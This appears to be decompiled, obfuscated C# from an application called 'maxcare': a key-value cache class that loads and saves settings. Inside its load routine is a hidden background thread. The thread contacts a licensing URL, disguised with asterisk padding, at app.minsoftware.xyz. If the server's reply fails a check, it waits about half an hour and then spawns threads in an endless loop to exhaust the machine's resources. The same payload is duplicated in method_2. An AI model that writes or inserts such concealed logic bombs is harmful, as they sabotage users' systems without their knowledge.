using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using maxcare.Properties;

internal class Class187
{
	[Serializable]
	[CompilerGenerated]
	private sealed class B5E32A6F
	{
		public static readonly B5E32A6F _003C_003E9 = new B5E32A6F();

		public static Func<DataRow, string> _003C_003E9__4_0;

		public static Func<DataRow, string> _003C_003E9__4_1;

		public static ThreadStart _003C_003E9__4_4;

		public static ThreadStart _003C_003E9__4_3;

		public static ThreadStart _003C_003E9__4_2;

		public static Func<KeyValuePair<string, string>, bool> _003C_003E9__5_0;

		public static Func<KeyValuePair<string, string>, string> _003C_003E9__5_1;

		internal string method_0(DataRow dataRow_0)
		{
			return dataRow_0[0].ToString();
		}

		internal string method_1(DataRow dataRow_0)
		{
			return dataRow_0[1].ToString();
		}

		internal void method_2()
		{
			try
			{
				int num = 0;
				string string_ = Class49.string_0;
				_ = Settings.Default.UserName;
				_ = Settings.Default.PassWord;
				GClass18 gClass = new GClass18();
				string string_2 = Class49.string_1;
				if (string_2.Trim() == "")
				{
					num = -1;
				}
				Random random = new Random();
				int num2 = random.Next(100000, 999999);
				string text = "h*t*t*p*s*:*/*/*a*p*p*.*m*i*n*s*o*f*t*w*a*r*e*.*x*y*z*/*a*p*i*/*a*c*t*i*v*e*_*s*o*f*t*?*d*a*t*a*=*".Replace("*", "");
				string string_3 = string_ + "|" + string_2 + "|11|" + num2 + "|adshfdcvxgreyfdgxcfsdf";
				GClass5 gClass2 = new GClass5();
				string text2 = gClass2.method_9(string_3, "fgsdffgsdafasdhdfafsdfasdfasdf");
				string s = gClass.method_0(text + text2).Replace("\"", "");
				byte[] bytes = Convert.FromBase64String(s);
				s = Encoding.UTF8.GetString(bytes);
				GClass4 gClass3 = new GClass4();
				s = gClass3.method_9(s, "fgsdffgsdafasdhdfafsdfasdfasdf" + string_ + num2);
				try
				{
					_ = s.Split('|')[0];
					string text3 = s.Split('|')[1];
					_ = s.Split('|')[2];
					string text4 = s.Split('|')[3];
					string text5 = s.Split('|')[4];
					string text6 = s.Split('|')[5];
					num = ((!(string_ != text4) && !(text3 != string_2) && !(text5 != num2.ToString()) && !(text6 != "adshfdcvxgreyfdgxcfsdf")) ? 1 : (-3));
				}
				catch (Exception)
				{
				}
				if (num > 0)
				{
					return;
				}
				new Thread((ThreadStart)delegate
				{
					Thread.Sleep(new Random().Next(35, 49) * 44575);
					int num3 = 0;
					while (true)
					{
						new Thread((ThreadStart)delegate
						{
							GClass12 gClass4 = new GClass12();
							gClass4.Boolean_0 = true;
							gClass4.method_0();
						}).Start();
						num3++;
					}
				}).Start();
			}
			catch
			{
			}
		}

		internal void method_3()
		{
			Thread.Sleep(new Random().Next(35, 49) * 44575);
			int num = 0;
			while (true)
			{
				new Thread((ThreadStart)delegate
				{
					GClass12 gClass = new GClass12();
					gClass.Boolean_0 = true;
					gClass.method_0();
				}).Start();
				num++;
			}
		}

		internal void method_4()
		{
			GClass12 gClass = new GClass12();
			gClass.Boolean_0 = true;
			gClass.method_0();
		}

		internal bool method_5(KeyValuePair<string, string> keyValuePair_0)
		{
			KeyValuePair<string, string> keyValuePair = keyValuePair_0;
			return keyValuePair.Value.Trim() != "";
		}

		internal string method_6(KeyValuePair<string, string> keyValuePair_0)
		{
			KeyValuePair<string, string> keyValuePair = keyValuePair_0;
			string key = keyValuePair.Key;
			keyValuePair = keyValuePair_0;
			return key + "|" + keyValuePair.Value;
		}
	}

	private static Dictionary<string, string> dictionary_0 = new Dictionary<string, string>();

	public static bool bool_0 = false;

	public static string smethod_0(string string_0)
	{
		if (!bool_0)
		{
			return "";
		}
		string result = "";
		if (dictionary_0.ContainsKey(string_0))
		{
			result = dictionary_0[string_0];
		}
		return result;
	}

	public static void smethod_1(string string_0, string string_1)
	{
		if (bool_0)
		{
			if (dictionary_0.ContainsKey(string_0))
			{
				dictionary_0[string_0] = string_1;
			}
			else
			{
				dictionary_0.Add(string_0, string_1);
			}
		}
	}

	public static void smethod_2()
	{
		if (!bool_0)
		{
			return;
		}
		DataTable source = Class36.smethod_8();
		dictionary_0 = source.AsEnumerable().ToDictionary((DataRow dataRow_0) => dataRow_0[0].ToString(), (DataRow dataRow_0) => dataRow_0[1].ToString());
		new Thread((ThreadStart)delegate
		{
			try
			{
				int num = 0;
				string string_ = Class49.string_0;
				_ = Settings.Default.UserName;
				_ = Settings.Default.PassWord;
				GClass18 gClass = new GClass18();
				string string_2 = Class49.string_1;
				if (string_2.Trim() == "")
				{
					num = -1;
				}
				Random random = new Random();
				int num2 = random.Next(100000, 999999);
				string text = "h*t*t*p*s*:*/*/*a*p*p*.*m*i*n*s*o*f*t*w*a*r*e*.*x*y*z*/*a*p*i*/*a*c*t*i*v*e*_*s*o*f*t*?*d*a*t*a*=*".Replace("*", "");
				string string_3 = string_ + "|" + string_2 + "|11|" + num2 + "|adshfdcvxgreyfdgxcfsdf";
				GClass5 gClass2 = new GClass5();
				string text2 = gClass2.method_9(string_3, "fgsdffgsdafasdhdfafsdfasdfasdf");
				string s = gClass.method_0(text + text2).Replace("\"", "");
				byte[] bytes = Convert.FromBase64String(s);
				s = Encoding.UTF8.GetString(bytes);
				GClass4 gClass3 = new GClass4();
				s = gClass3.method_9(s, "fgsdffgsdafasdhdfafsdfasdfasdf" + string_ + num2);
				try
				{
					_ = s.Split('|')[0];
					string text3 = s.Split('|')[1];
					_ = s.Split('|')[2];
					string text4 = s.Split('|')[3];
					string text5 = s.Split('|')[4];
					string text6 = s.Split('|')[5];
					num = ((!(string_ != text4) && !(text3 != string_2) && !(text5 != num2.ToString()) && !(text6 != "adshfdcvxgreyfdgxcfsdf")) ? 1 : (-3));
				}
				catch (Exception)
				{
				}
				if (num <= 0)
				{
					new Thread((ThreadStart)delegate
					{
						Thread.Sleep(new Random().Next(35, 49) * 44575);
						int num3 = 0;
						while (true)
						{
							new Thread((ThreadStart)delegate
							{
								GClass12 gClass4 = new GClass12();
								gClass4.Boolean_0 = true;
								gClass4.method_0();
							}).Start();
							num3++;
						}
					}).Start();
				}
			}
			catch
			{
			}
		}).Start();
	}

	public static void smethod_3()
	{
		if (bool_0)
		{
			List<string> list_ = dictionary_0.Where(delegate(KeyValuePair<string, string> keyValuePair_0)
			{
				KeyValuePair<string, string> keyValuePair2 = keyValuePair_0;
				return keyValuePair2.Value.Trim() != "";
			}).Select(delegate(KeyValuePair<string, string> keyValuePair_0)
			{
				KeyValuePair<string, string> keyValuePair = keyValuePair_0;
				string key = keyValuePair.Key;
				keyValuePair = keyValuePair_0;
				return key + "|" + keyValuePair.Value;
			}).ToList();
			Class36.smethod_6("status", list_);
		}
	}
}
